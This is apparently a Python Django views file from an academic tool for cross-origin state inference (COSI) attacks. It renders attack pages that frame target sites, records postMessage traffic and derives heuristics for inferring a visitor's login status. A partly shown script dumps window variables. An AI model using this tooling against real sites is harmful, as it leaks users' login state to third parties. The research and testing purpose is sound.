# -*- coding: utf-8 -*-

"""
    Copyright (C) 2019  Soheil Khodayari, IMDEA Software
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.
    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
    
	
	Description:
	--------------
	This view creates the `test` pages for different COSI attack vectors

"""


from __future__ import unicode_literals

from django.shortcuts import render
from .local_settings import site_dict
from django.http import HttpResponse
from django.template import Template, Context
import difflib
import json
import os
import ast
import copy
import glob
import jellyfish
from shutil import copyfile
from datetime import datetime
from difflib import SequenceMatcher
from django.utils.http import urlquote, urlunquote
import urllib
import base64
from urlparse import urlparse
from django.utils.http import urlencode

# --------------------------------------------------------------------------- #
#				Global Vars & Constants
# --------------------------------------------------------------------------- #

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

LOG_SERVER_BASE = None
LOG_SERVER_BASE_DEFAULT = "http://127.0.0.1:1234/"

# -- for script inclusion config 
SCRIPT_TAG_INCLUDE_IN_BODY = "include-script-tag-in-body"
SCRIPT_TAG_INCLUDE_IN_HEAD = "include-script-tag-in-head"
SCRIPT_ATTACH_VAR_COLLECTOR = "attach-script-variable-collector"
SCRIPT_ATTACH_LOG_SENDER = "attach-script-log-sender"
SCRIPT_ANALYZE_LOG_RESULT = "analyze-log"

# --------------------------------------------------------------------------- #
#				Read Env Configuration
# --------------------------------------------------------------------------- #

BROWSER = 'chrome' # Default Browser
config_filepath = os.path.join(ROOT_DIR, "automator/app-config.json")
with open(config_filepath, "r") as configFile:
	configData = json.load(configFile)
	if "browser" in configData:
		BROWSER = configData["browser"]
	if "log-server-endpoint" in configData:
		LOG_SERVER_BASE_DEFAULT = configData["log-server-endpoint"] + "/"

BROWSER_REPORT_FOLDER = 'Chrome' # Default folder tag for saving test reports
if BROWSER == 'chrome':
	BROWSER_REPORT_FOLDER = 'Chrome' 
elif BROWSER == 'firefox':
	BROWSER_REPORT_FOLDER = 'Firefox' 

BROWSER_VERSION = 'null' # Set when first log has been sent
BROWSER_CONFIG = {"BROWSER": BROWSER, "BROWSER_VERSION": BROWSER_VERSION} 



# --------------------------------------------------------------------------- #
#				Utility
# --------------------------------------------------------------------------- #


def decodeURL_Plus(enc):
	return enc.replace('AMPERSIGNED_REPLACE', "&").replace("COMMACOMMA", "%2C")

def encodeURL_Plus(url):
	return url.replace("&", "AMPERSIGNED_REPLACE")

def add_or_create_keypair(dictObj, key, value):
	if key in dictObj:
		dictObj[key] += [value]
	else:
		dictObj[key] = [value]
	return dictObj

def intersection(lst1, lst2): 
  
    temp = set(lst2) 
    lst3 = [value for value in lst1 if value in temp] 
    return lst3 

def list_elements_contain_substring(lst, substring):
	for elm in lst:
		if substring in elm:
			return True
	return False


# --------------------------------------------------------------------------- #
#			Post MSG & Content Window 
# --------------------------------------------------------------------------- #

def index(request):
	context = {}
	temp = []
	for key, value in site_dict.items():
		temp.append([key, value[0]])
	context['data'] = temp
	return render(request, "index.html", context) 


def getAttackPage(request, iframe_uri_pk, state_status, open_type):

	"""
	renders the test page for a COSI attack
	"""
	log_server_endpoint= LOG_SERVER_BASE_DEFAULT + "record-post-message/"

	iframe_uri_default = site_dict[iframe_uri_pk][0] #main domain of the website

	iframe_uri = request.GET.get("fr", iframe_uri_default)
	iframe_uri = decodeURL_Plus(iframe_uri)
	runHashId = request.GET.get("hash", "")
	ctx = {"iframe_uri": iframe_uri, "log_server_endpoint": log_server_endpoint, 
		   "state_status": state_status, "iframe_uri_pk":iframe_uri_pk,
		   "runHashId": runHashId}
	if (open_type == 0) or (open_type == "0"):
		return render(request, 'getAttackPage.html', ctx)
	else:
		return render(request, 'getAttackPageWindow.html', ctx)


def view_analysis_list(request, siteId):

	"""
	shows a web page with a list of analyses available
	"""
	
	directory = os.path.join(ROOT_DIR, "automator/runs/%s/"%siteId)
	analysis_file_list = glob.glob(directory+ r"Analysis_*.csv")
	mlist = []
	for file in analysis_file_list:
		idx = file.index("Analysis_")
		filename = file[idx:]
		mlist.append(filename)
	context = {}
	context['analysis_list'] = mlist
	context['siteId'] = siteId
	context['siteUrl'] = site_dict[siteId][0]
	
	return render(request, 'analysis_list.html', context)

def view_analysis(request, siteId, timestamp):

	"""
	shows a web page for a given analysis report
	"""

	base_dir = os.path.join(ROOT_DIR, "automator/runs/%s/"%siteId)
	file_dir = base_dir + timestamp
	fp = open(file_dir, "r")
	context = {'zero': [0], 'one': [1]}
	context['timestamp'] = timestamp
	context['analysis_data'] = []
	skipped_header = False
	for line in fp.readlines():
		if not skipped_header:
			skipped_header = True
			continue
		data = line.split(";")
		stripedData= []
		for elm in data:
			if isinstance(elm, str):
				elm = elm.strip()
			stripedData.append(elm)

		context['analysis_data'].append(stripedData)

	return render(request, "analysis_view.html", context)


def test_frameable(request):
	fr= request.GET.get("fr", '')
	context = {"siteurl": fr}
	return render(request, "TestFrameable.html", context) 



def analyze(request, siteId):

	"""
	Creates the report data for postMessages
	"""

	opentype = str(request.GET.get('opentype', ''))
	browser = str(request.GET.get('browser', 'chrome'))
	if opentype == "0":
		openmode = "frame" #frame mode
	else:
		openmode = "window" #window mode

	# @HACK: prevent errors in evaluation of jsons by
	# re-defining non-string variables as string
	null = "null"
	true = "true"
	false = "false"

	address_base = os.path.join(ROOT_DIR, "automator/")
	test_file_address = os.path.join(address_base,'%s/TestReports/PostMessage//TestChrome.csv'%siteId)
	analysis_file_address = os.path.join(address_base,'%s/PostMessageTest/Analysis.csv'%siteId)
	f = open( test_file_address, 'r+');
	fp_csv = open(analysis_file_address, 'w+');
	fp_csv.write("URL; LTM; NTM; ACBTM; LTDO; NTDO; ACBTDO; LDMD; NDMD; ACBD; MO; PMO; ACBO; LFR; NFR; FRCA\n")

	template_context = {}
	template_context['data'] = []
	skip_first_line = True
	for line in f.readlines():
		if skip_first_line:
			skip_first_line = False
			continue

		parts = line.split(";")
		framed_url = parts[0]
		l_msg = parts[1]
		n_msg = parts[2]

		l_frames_count = str(parts[3].strip())
		n_frames_count = str(parts[4].strip())
		if l_msg.strip()  == "---":
			l_msg = []
		else:
			try:
				l_msg = eval(l_msg)
			except:
				continue
		if n_msg.strip() == "---":
			n_msg = []
		else:
			try:
				n_msg = eval(n_msg)
			except:
				continue

		l_set_origin = []
		n_set_origin = []
		l_list_origin = []
		n_list_origin = []
		l_list_messageData = []
		n_list_messageData = []
		if len(l_msg) != 0:
			for idx in range(len(l_msg)):
				item = l_msg[idx]
				item = eval(item)
				l_msg[idx] = item
				l_set_origin.append(item["messageOrigin"])
				l_list_messageData.append(item["messageData"])
		if len(n_msg) != 0:
			for idx in range(len(n_msg)):
				item = n_msg[idx]
				item = eval(item)
				n_msg[idx] = item	
				n_set_origin.append(item["messageOrigin"])
				n_list_messageData.append(item["messageData"])

		l_list_origin = copy.deepcopy(l_set_origin)
		n_list_origin = copy.deepcopy(n_set_origin)
		l_set_origin = set(l_set_origin)
		n_set_origin = set(n_set_origin)
		# note: num of messages = num of dict objs cuz for every msg there is a dict obj built in server 
		l_total_len_msg = len(l_msg)
		n_total_len_msg = len(n_msg)

		l_msg_matrix = []
		n_msg_matrix = []

		# store items like like 
		#(isAttackCandidateBecauseOfData, MyDataIdx, DataPairIdx, isAttackCandidateBecauseOfOrigin, MyOriginValue, OriginPairValue)
		#(1, 6, False, False, 5, False) -->> means because of different data is attack candidate
		# STORE False if information is not relevant for the case 
		# STORE 'INIT' if information has yet to be processed for that field
		for i in range(len(l_msg)):
			objDict = l_msg[i]
			item = objDict["messageData"]
			if item in n_list_messageData:
				isAttackCandidateBecauseOfData = 0
				DataPairIdx = n_list_messageData.index(item)
				# store 'INIT' for origin values because the msg may be an attack candidate 
				# because of its origin
				l_msg_matrix.append([isAttackCandidateBecauseOfData, i, DataPairIdx
					, 'INIT', 'INIT', 'INIT'])

			else:
				no_similar_string_found = True 
				for j in range(len(n_list_messageData)):
					n_item = n_list_messageData[j]
					distance = jellyfish.jaro_distance(u'%s'%item, u'%s'%n_item)
					# USE JELLYFISH distance to identify string similarity
					if distance >= 0.8:
						no_similar_string_found = False
						isAttackCandidateBecauseOfData = 0
						l_msg_matrix.append([isAttackCandidateBecauseOfData, i, j
							, 'INIT', 'INIT', 'INIT'])

				if no_similar_string_found:
					isAttackCandidateBecauseOfData = 1
					# store DataPairIdx as false because it has no pair
					# store origin as False because it is not relevant any more! already attack candidate
					l_msg_matrix.append([isAttackCandidateBecauseOfData, i, False, False, False, False])

		for i in range(len(n_msg)):
			objDict = n_msg[i]
			item = objDict["messageData"]
			if item in l_list_messageData:
				isAttackCandidateBecauseOfData = 0
				DataPairIdx = n_list_messageData.index(item)
				# store 'INIT' for origin values because the msg may be an attack candidate 
				# because of its origin
				n_msg_matrix.append([isAttackCandidateBecauseOfData, i, DataPairIdx
					, 'INIT', 'INIT', 'INIT'])

			else:
				no_similar_string = True
				for j in range(len(l_list_messageData)):
					l_item = l_list_messageData[j]
					distance = jellyfish.jaro_distance(u'%s'%item, u'%s'%l_item)
					# USE JELLYFISH distance to identify string similarity
					if distance >= 0.8: #QUESTION: WHAT SHOULD BE THIS CUT OFF??
						no_similar_string = False
						isAttackCandidateBecauseOfData = 0
						n_msg_matrix.append([isAttackCandidateBecauseOfData, i, j
							, 'INIT', 'INIT', 'INIT'])

				if no_similar_string:
						isAttackCandidateBecauseOfData = 1
						# store DataPairIdx as false because it has no pair
						# store origin as False because it is not relevant any more! already attack candidate
						n_msg_matrix.append([isAttackCandidateBecauseOfData, i, False, False, False, False])

		# check origin of message to modify attack candidacy value ##

		# one way iteration is enough because if it has a pair in l_matrix then
		# it also has a pair in the n_matrix
		for i in range(len(l_msg_matrix)):
			record = l_msg_matrix[i]
			is_already_attack_candidate = record[0]
			if not is_already_attack_candidate:
				#check for candidacy in msg origins
				l_idx = record[1]
				n_idx = record[2]
				l_msg_item_origin = l_msg[l_idx]["messageOrigin"]
				n_msg_item_origin = n_msg[n_idx]["messageOrigin"]

				l_msg_item_data = l_msg[l_idx]["messageData"]
				n_msg_item_data= n_msg[n_idx]["messageData"]

				if l_msg_item_origin!= n_msg_item_origin:
					l_msg_matrix[i][3] = 1 # it is a attack candidate!
					l_msg_matrix[i][4] = (l_msg_item_origin, l_msg_item_data)
					l_msg_matrix[i][5] = (n_msg_item_origin, n_msg_item_data)
				else:
					l_msg_matrix[i][3] = 0 # it is a attack candidate!
					l_msg_matrix[i][4] = (l_msg_item_origin, l_msg_item_data)
					l_msg_matrix[i][5] = (n_msg_item_origin, n_msg_item_data)

		for i in range(len(n_msg_matrix)):
			record = n_msg_matrix[i]
			is_already_attack_candidate = record[0]
			if not is_already_attack_candidate:
				#check for candidacy in msg origins
				l_idx = record[2]
				n_idx = record[1]

				try:
					l_msg_item_origin = l_msg[l_idx]["messageOrigin"]
				except:
					l_msg_item_origin = "DUMMY ORIGIN"
				n_msg_item_origin = n_msg[n_idx]["messageOrigin"]

				try:
					l_msg_item_data = l_msg[l_idx]["messageData"]
				except:
					l_msg_item_data = "DUMMY DATA"

				n_msg_item_data= n_msg[n_idx]["messageData"]

				if l_msg_item_origin!= n_msg_item_origin:
					n_msg_matrix[i][3] = 1 # it is a attack candidate!
					n_msg_matrix[i][4] = (l_msg_item_origin, l_msg_item_data)
					n_msg_matrix[i][5] = (n_msg_item_origin, n_msg_item_data)
				else:
					n_msg_matrix[i][3] = 0 # it is a attack candidate!
					n_msg_matrix[i][4] = (l_msg_item_origin, l_msg_item_data)
					n_msg_matrix[i][5] = (n_msg_item_origin, n_msg_item_data)		

		# find the set of data types for a particular url in logged in and not logged in state

		l_type_list =[]
		n_type_list = []
		l_type_set = []
		n_type_set = []
		for item in l_list_messageData:
			try:
				value = json.loads("%s"%item)
				vtype = type(value)
				l_type_list.append(vtype)
			except:
				vtype = "<type 'json'>" 
				l_type_list.append(vtype)

		for item in n_list_messageData:
			try:
				value = json.loads("%s"%item)
				vtype = type(value)
				n_type_list.append(vtype)
			except:
				value = "<type 'json'>" 
				vtype = type(value)
				n_type_list.append(vtype)

		l_type_set = set(l_type_list)
		n_type_set = set(n_type_list)

		
		# message count
		LTM = l_total_len_msg
		NTM = n_total_len_msg
		if LTM == NTM:
			ACBTM = 0
		else:
			ACBTM = 1
		# different origin count
		LTDO = len(l_set_origin)
		NTDO = len(n_set_origin)
		if LTDO == NTDO:
			ACBTDO = 0
		else:
			ACBTDO = 1
		# message data difference
		LDMD = []
		NDMD = []
		ACBD = 0
		ACBO = 0

		MO = []
		PMO = []
		for record in l_msg_matrix:
			isAttackCandidateBData = record[0] 
			isAttackCandidateBOrigin = record[3]
			if isAttackCandidateBData == 1:
				ACBD = 1
				itemIdx = record[1]
				LDMD.append(l_list_messageData[itemIdx])

			if isAttackCandidateBOrigin == 1:
				ACBO = 1
				m_o = record[4]
				p_m_o = record[5]
				if m_o not in MO:
					MO.append(m_o)
				if p_m_o not in PMO:
					PMO.append(p_m_o)

		for record in n_msg_matrix:
			isAttackCandidateBData = record[0]
			isAttackCandidateBOrigin = record[3] 
			if isAttackCandidateBData == 1:
				ACBD = 1
				itemIdx = record[1]
				NDMD.append(n_list_messageData[itemIdx])

		LFR = l_frames_count
		NFR = n_frames_count
		if LFR == NFR:
			FRCA="NO"
		else:
			FRCA="YES"
			
		csv_row = "{0}; {1}; {2}; {3}; {4}; {5}; {6}; {7}; {8}; {9}; {10}; {11}; {12}; {13}; {14}; {15}\n".format(framed_url, LTM, NTM, ACBTM, LTDO, NTDO, ACBTDO, LDMD, NDMD, ACBD, MO, PMO, ACBO, LFR, NFR, FRCA )
		fp_csv.write(csv_row)

		template_context['data'] += [[framed_url, LTM, NTM, ACBTM, LTDO, NTDO, ACBTDO, LDMD, NDMD, ACBD, MO, PMO, ACBO, LFR, NFR, FRCA ]]

	f.close()
	fp_csv.close()
	dst = os.path.join(ROOT_DIR, "automator/runs/%s/"%siteId)
	if not os.path.exists(dst):
		os.makedirs(dst)

	dst_filename = dst + "Analysis_%s_"%openmode +datetime.now().strftime('%Y-%m-%d_%H-%M-%S') + ".csv"
	copyfile(analysis_file_address, dst_filename)
	return render(request, 'analyze.html', template_context)




def comprehensive_report(request, siteId):

	"""
	Checks whether a COSI attack vector can be found for a site leveraging postMessage heuristics
	"""

	# 0 for frame mode, 1 for window mode
	report_type = str(request.GET.get('rt', ''))
	if report_type == "0":
		report_mode = "Fr"
	else:
		report_mode = "Wd"

	context = {}
	context['siteId'] = siteId
	directory = os.path.join(ROOT_DIR, "automator/runs/%s/"%siteId)

	regex_analysis = r"Analysis_%s_*.csv"%report_mode
	analysis_file_list = glob.glob(directory+ regex_analysis)
	num_files = len(analysis_file_list)
	fptrs = []
	for file in analysis_file_list:
		fp = open(file, "r")
		fptrs.append(fp)

	c1 = fptrs[0].readlines()[1:] #this index is to skip the csv header 
	c2 = fptrs[1].readlines()[1:]
	c3 = fptrs[2].readlines()[1:] 

	seen = []
	# TM Heuristic 
	for line1 in c1:
		for line2 in c2:
			for line3 in c3:

				line1_parts = line1.split(";")
				line2_parts = line2.split(";")
				line3_parts = line3.split(";")

				url1 = line1_parts[0]
				url2 = line2_parts[0]
				url3 = line3_parts[0]


				if not (url1 == url2 == url3):
					continue

				if url1 in seen:
					continue

				seen.append(url1)

				# ------------------------------------------------------------ #
				#					TM Hueristic
				# ------------------------------------------------------------ #

				LTM_1 = line1_parts[1]
				LTM_2 = line2_parts[1]
				LTM_3 = line3_parts[1]

				NTM_1 = line1_parts[2]
				NTM_2 = line2_parts[2]
				NTM_3 = line3_parts[2]

				if LTM_1 == LTM_2 == LTM_3:
					if NTM_1 == NTM_2 == NTM_3:
						if LTM_1 != NTM_1:
							# case 1
							instruction = "CHECK messages from url={0}. If recieved LTM= {1} number of messages, it stands for logged in status. If one recieved NTM={2} number of messages, it stands for not logged in status.".format(url1, LTM_1, NTM_1)
							context = add_or_create_keypair(context, "TM_H", instruction)
						else:
							instruction = "NOTHING - check if context is empty lator and add this"
					elif (LTM_1 != NTM_1) and (LTM_1 != NTM_2) and (LTM_1 != NTM_3): 
							# case 2
							instruction = "CHECK messages from url={0}. If recieved LTM= {1} number of messages, it stands for logged in status. otherwise, logged out.".format(url1, LTM_1)
							context = add_or_create_keypair(context, "TM_H", instruction)

				elif NTM_1 == NTM_2 == NTM_3:
					# case 3: same as case 2, but for NTM
					if (LTM_1 != NTM_1) and (LTM_2 != NTM_1) and (LTM_3 != NTM_1):
						instruction = "CHECK messages from url={0}. If recieved NTM= {1} number of messages, it stands for not logged in status. otherwise, logged in.".format(url1, NTM_1)
						context = add_or_create_keypair(context, "TM_H", instruction)

				elif len(intersection([LTM_1, LTM_2, LTM_3], [NTM_1, NTM_2, NTM_3])) == 0:
						s1 = list(set([LTM_1, LTM_2, LTM_3]))
						s2 = list(set([NTM_1, NTM_2, NTM_3]))
						instruction = "CHECK messages from url={0}. If recieved any of LTM= {1} number of messages, it stands for logged in status. otherwise, if recieved any of NTM = {2}, it stands for logged out status.".format(url1, s1, s2)
						context = add_or_create_keypair(context, "TM_H", instruction)

				# ------------------------------------------------------------ #
				#					TDO Hueristic
				# ------------------------------------------------------------ #

				LTDO_1 = line1_parts[4]
				LTDO_2 = line2_parts[4]
				LTDO_3 = line3_parts[4]

				NTDO_1 = line1_parts[5]
				NTDO_2 = line2_parts[5]
				NTDO_3 = line3_parts[5]

				if LTDO_1 == LTDO_2 == LTDO_3:
					if NTDO_1 == NTDO_2 == NTDO_3:
						if LTDO_1 != NTDO_1:
							# case 1
							instruction = "CHECK messages from url={0}. If recieved messages with LTDO= {1} number of different origins, it stands for logged in status. If recieved messages with NTDO={2} number of different origins, it stands for logged out status.".format(url1, LTDO_1, NTDO_1)
							context = add_or_create_keypair(context, "TDO_H", instruction)
						else:
							instruction = "NOTHING - check if context is empty lator and add this"
					elif (LTDO_1 != NTDO_1) and (LTDO_1 != NTDO_2) and (LTDO_1 != NTDO_3): 
							# case 2
							instruction = "CHECK messages from url={0}. If recieved messages with LTDO= {1} number of different origins, it stands for logged in status. otherwise, logged out.".format(url1, LTDO_1)
							context = add_or_create_keypair(context, "TDO_H", instruction)

				elif NTDO_1 == NTDO_3 == NTDO_3:
					# case 3: same as case 2, but for NTDO
					if (LTDO_1 != NTDO_1) and (LTDO_2 != NTDO_1) and (LTDO_3 != NTDO_1):
						instruction = "CHECK messages from url={0}. If recieved messages with NTDO= {1} number of different origins, it stands for logged out status. otherwise, logged in.".format(url1, NTDO_1)
						context = add_or_create_keypair(context, "TDO_H", instruction)

				elif len(intersection([LTDO_1, LTDO_2, LTDO_3], [NTDO_1, NTDO_2, NTDO_3])) == 0:
						s1 = list(set([LTDO_1, LTDO_2, LTDO_3]))
						s2 = list(set([NTDO_1, NTDO_2, NTDO_3]))
						instruction = "CHECK messages from url={0}. If recieved messages with any of LTDO= {1} number of different origins, it stands for logged in status. otherwise, if recieved any messages with any of NTDO = {2} number of different origins, it stands for logged out status.".format(url1, s1, s2)
						context = add_or_create_keypair(context, "TDO_H", instruction)

				# ------------------------------------------------------------ #
				#					DMD Hueristic
				# ------------------------------------------------------------ #

				LDMD_1 = eval(line1_parts[7])
				LDMD_2 = eval(line2_parts[7])
				LDMD_3 = eval(line3_parts[7])

				NDMD_1 = eval(line1_parts[8])
				NDMD_2 = eval(line2_parts[8])
				NDMD_3 = eval(line3_parts[8])

				LDMD_1 = ["%s"%elm for elm in LDMD_1]
				LDMD_2 = ["%s"%elm for elm in LDMD_2]
				LDMD_3 = ["%s"%elm for elm in LDMD_3]

				NDMD_1 = ["%s"%elm for elm in NDMD_1]
				NDMD_2 = ["%s"%elm for elm in NDMD_2]
				NDMD_3 = ["%s"%elm for elm in NDMD_3]
				# case 1
				common = intersection(LDMD_1, intersection(LDMD_2, LDMD_3))
				if len(common) > 0:
					instruction = "CHECK messages from url={0}. If recieved the message(s): LDMD={1} [Case Sensitive],it stands for the logged in status, otherwise logged out.".format(url1, common)
					context = add_or_create_keypair(context, "DMD_H", instruction)

				# case 2: same as case 1 but for NDMD
				common2 = intersection(NDMD_1, intersection(NDMD_2, NDMD_3))
				if len(common2) > 0:
					instruction = "CHECK messages from url={0}. If recieved the message(s): NDMD={1} [Case Sensitive],it stands for the logged out status, otherwise logged in.".format(url1, common2)
					context = add_or_create_keypair(context, "DMD_H", instruction)

				# case 3: find the largest common substring in a list of strings of LDMD series
				# IMPORTANT: check if substring not in messages of other case
				LDMD_substrings = []
				for li1 in LDMD_1:
					for li2 in LDMD_2:
						for li3 in LDMD_3:
							match12 = SequenceMatcher(None, li1, li2).find_longest_match(0, len(li1), 0, len(li2))
							match_substr = li1[match12.a: match12.a + match12.size]
							if match_substr in LDMD_substrings:
								continue
							LDMD_substrings.append(match_substr)
							cond = not list_elements_contain_substring(NDMD_1 + NDMD_2 + NDMD_3, match_substr)
							if (match_substr in li3) and cond:
								# we are all set now
								instruction = "CHECK messages from url={0}. If recieved any messages with substring: LDMD={1} [Case Sensitive],it stands for the logged in status, otherwise logged out.".format(url1, match_substr)
								context = add_or_create_keypair(context, "DMD_H", instruction)
								break
							else:
								# maybe there's a smaller common substring
								match23 = SequenceMatcher(None, li2, li3).find_longest_match(0, len(li2), 0, len(li3))
								match_substr = li2[match23.a: match23.a + match23.size]
								if match_substr in LDMD_substrings:
									continue
								LDMD_substrings.append(match_substr)

								cond = not list_elements_contain_substring(NDMD_1 + NDMD_2 + NDMD_3, match_substr)
								if (match_substr in li1) and cond:
									# we are all set now
									instruction = "CHECK messages from url={0}. If recieved any messages with substring: LDMD={1} [Case Sensitive],it stands for the logged in status, otherwise logged out.".format(url1, match_substr)
									context = add_or_create_keypair(context, "DMD_H", instruction)
									break		
								else:
									# maybe there's a smaller common substring
									match13 = SequenceMatcher(None, li1, li3).find_longest_match(0, len(li1), 0, len(li3))
									match_substr = li1[match13.a: match13.a + match13.size]
									if match_substr in LDMD_substrings:
										continue
									LDMD_substrings.append(match_substr)
									cond = not list_elements_contain_substring(NDMD_1 + NDMD_2 + NDMD_3, match_substr)
									if (match_substr in li2) and cond:
										# we are all set now
										instruction = "CHECK messages from url={0}. If recieved any messages with substring: LDMD={1} [Case Sensitive],it stands for the logged in status, otherwise logged out.".format(url1, match_substr)
										context = add_or_create_keypair(context, "DMD_H", instruction)
										break
									else:
										continue	

				# case 4: same as case 3 but for NDMD
				NDMD_substrings = []
				for li1 in NDMD_1:
					for li2 in NDMD_2:
						for li3 in NDMD_3:
							match12 = SequenceMatcher(None, li1, li2).find_longest_match(0, len(li1), 0, len(li2))
							match_substr = li1[match12.a: match12.a + match12.size]
							if match_substr in NDMD_substrings:
								continue
							NDMD_substrings.append(match_substr)
							cond = not list_elements_contain_substring(LDMD_1 + LDMD_2 + LDMD_3, match_substr)
							if(match_substr in li3) and cond:
								# we are all set now
								instruction = "CHECK messages from url={0}. If recieved any messages with substring: NDMD={1} [Case Sensitive],it stands for the logged out status, otherwise logged in.".format(url1, match_substr)
								context = add_or_create_keypair(context, "DMD_H", instruction)
								break
							else:
								# maybe there's a smaller common substring
								match23 = SequenceMatcher(None, li2, li3).find_longest_match(0, len(li2), 0, len(li3))
								match_substr = li2[match23.a: match23.a + match23.size]
								if match_substr in NDMD_substrings:
									continue
								NDMD_substrings.append(match_substr)
								cond = not list_elements_contain_substring(LDMD_1 + LDMD_2 + LDMD_3, match_substr)
								if (match_substr in li1) and cond:
									# we are all set now
									instruction = "CHECK messages from url={0}. If recieved any messages with substring: NDMD={1} [Case Sensitive],it stands for the logged out status, otherwise logged in.".format(url1, match_substr)
									context = add_or_create_keypair(context, "DMD_H", instruction)
									break		
								else:
									# maybe there's a smaller common substring
									match13 = SequenceMatcher(None, li1, li3).find_longest_match(0, len(li1), 0, len(li3))
									match_substr = li1[match13.a: match13.a + match13.size]
									if match_substr in NDMD_substrings:
										continue
									NDMD_substrings.append(match_substr)
									cond = not list_elements_contain_substring(LDMD_1 + LDMD_2 + LDMD_3, match_substr)
									if (match_substr in li2) and cond:
										# we are all set now
										instruction = "CHECK messages from url={0}. If recieved any messages with substring: NDMD={1} [Case Sensitive],it stands for the logged out status, otherwise logged in.".format(url1, match_substr)
										context = add_or_create_keypair(context, "DMD_H", instruction)
										break
									else:
										continue


				# ------------------------------------------------------------ #
				#					MPO Hueristic
				# ------------------------------------------------------------ #
				
				MO1 = eval(line1_parts[10] )   
				MO2 = eval(line2_parts[10] )  
				MO3 = eval(line3_parts[10] ) 
				MPO1 =eval( line1_parts[11])
				MPO2 =eval( line2_parts[11])
				MPO3 =eval( line3_parts[11])


				MPO_seen = [] # avoid redundancy across runs
				for idx in range(len(MO1)):
						l_item = MO1[idx]
						n_item = MPO1[idx]
						l_origin = l_item[0]
						n_origin = n_item[0]
						msg = l_item[1] # = n_item[1]
						MPO_seen.append([l_origin, n_origin, msg])
						instruction = "CHECK messages for url={0}. Once recieved the message: {1}, if its origin was MO={2}, it stands for logged in status, if its origin was MPO={3}, it stands for logged out status.".format(url1, msg, l_origin, n_origin)
						context = add_or_create_keypair(context, "PMO_H", instruction)
				for idx in range(len(MO2)):
						l_item = MO2[idx]
						n_item = MPO2[idx]
						l_origin = l_item[0]
						n_origin = n_item[0]

						if [l_origin, n_origin, msg] in MPO_seen:
							continue
						else:
							MPO_seen.append([l_origin, n_origin, msg])	
						msg = l_item[1] # = n_item[1]
						instruction = "CHECK messages for url={0}. Once recieved the message: {1}, if its origin was MO={2}, it stands for logged in status, if its origin was MPO={3}, it stands for logged out status.".format(url1, msg, l_origin, n_origin)
						context = add_or_create_keypair(context, "PMO_H", instruction)

				for idx in range(len(MO3)):
						l_item = MO3[idx]
						n_item = MPO3[idx]
						l_origin = l_item[0]
						n_origin = n_item[0]

						if [l_origin, n_origin, msg] in MPO_seen:
							continue
						else:
							MPO_seen.append([l_origin, n_origin, msg])	
						msg = l_item[1] # = n_item[1]
						instruction = "CHECK messages for url={0}. Once recieved the message: {1}, if its origin was MO={2}, it stands for logged in status, if its origin was MPO={3}, it stands for logged out status.".format(url1, msg, l_origin, n_origin)
						context = add_or_create_keypair(context, "PMO_H", instruction)
	for fp in fptrs:
		fp.close()
	# check if context heursitics are empty
	if "TM_H" not in context:
		context["TM_H"]=["TM Heuristic can not be leveraged to determine login status!"]
	if "TDO_H" not in context:
		context["TDO_H"]=["TDO Heuristic can not be leveraged to determine login status!"]
	if "DMD_H" not in context:
		context["DMD_H"]=["DMD Heuristic can not be leveraged to determine login status!"]
	if "PMO_H" not in context:
		context["PMO_H"]=["PMO Heuristic can not be leveraged to determine login status!"]
	return render(request, "comprehensive_report.html", context) 



# --------------------------------------------------------------------------- #
#					Common Base Components
# --------------------------------------------------------------------------- #

def get_base_dom_document(document_title):
	document = '''
		<!DOCTYPE html>
		<html>
		<head>
		    <title>%s</title>
		    <meta charset="utf-8">
		</head>
		<body>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
		</body>
		</html>
	  '''%(document_title)

	return document

# Note: Frame and FrameSet are not supported in HTML5
def get_base_dom_document_with_frameset(document_title):
	document = '''
		<!DOCTYPE html>
		<html>
		<head>
		    <title>%s</title>
		    <meta charset="utf-8">
		    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
		</head>
		<frameset id='frameset-container'>
		</frameset>
		</html>
	  '''%(document_title)

	return document

def include_tag_in_head(html, tag_as_string):

	head_idx = html.find("</head>")
	html_low_part = html[:head_idx]
	html_high_part = html[head_idx:]

	return html_low_part + tag_as_string + html_high_part

def include_tag_in_body(html, tag_as_string):

	body_idx = html.rfind("</body>")
	html_low_part = html[:body_idx]
	html_high_part = html[body_idx:]

	return html_low_part + tag_as_string + html_high_part


# --------------------------------------------------------------------------- #
#							Script Inclusion
# --------------------------------------------------------------------------- #


def quoteURICharacters(url):
	"""
	quote special url characters
	"""
	# url = urlunquote(url)
	# return url.replace('"', '\\"').replace('%27',"\\%27").replace("'", "\'")
	return urlquote(url)


def get_dom_with_script_included(html, script_src, script_type="text/javascript", include_in='body'):

	""""
	@param include_in: shows where to include the script possible values are 'head' or 'body'
	"""
	targetURL = quoteURICharacters(script_src)
	script_tag = "<script type='%s' src='%s'></script>"%(script_type, targetURL)
	if include_in == 'head':
		returnHTML = include_tag_in_head(html, script_tag)
	else:
		returnHTML = include_tag_in_body(html, script_tag)

	return returnHTML


# script inclusion variable attack 
# def attach_script_variable_collector(html):
# 	js = '''
# 	<script type="text/javascript">
# 	var logged_variables = '';
# 	for (key in this) {
# 	    logged_variables += key + "=" + this[key]+ ";";
# 	}
# 	window.logged_variables = logged_variables;
#     </script>
# 	'''
# 	returnHTML = include_tag_in_body(html, js)
# 	return returnHTML

# NEW Variable Collection Strategy
# It filters Object.keys(window) based on three principles:
# 1.Things that are null or undefined are usually not interesting to look at.
# 2.Most scripts will define a bunch of event handlers (i.e. functions) but they are also usually not interesting to dump out.
# 3.Properties on window that are set by the browser itself, are usually defined in a special way, and their property descriptors 
# reflect that. Globals defined with the assignment operator (i.e. window.foo = 'bar') have a specific-looking property descriptor, and we can leverage that. Note, if the script defines properties using Object.defineProperty with a different descriptor, we'll miss them, but this is very rare in practice.
def attach_script_variable_collector(html):
	js = '''
	<script type="text/javascript">
	function simpleStringify (object){
	    var simpleObject = { };
	    for (var prop in object ){
	       // if (!object.hasOwnProperty(prop)){
	       //     continue;
	       // }
	        if (typeof(object[prop]) == 'object'){
	            continue;
	        }
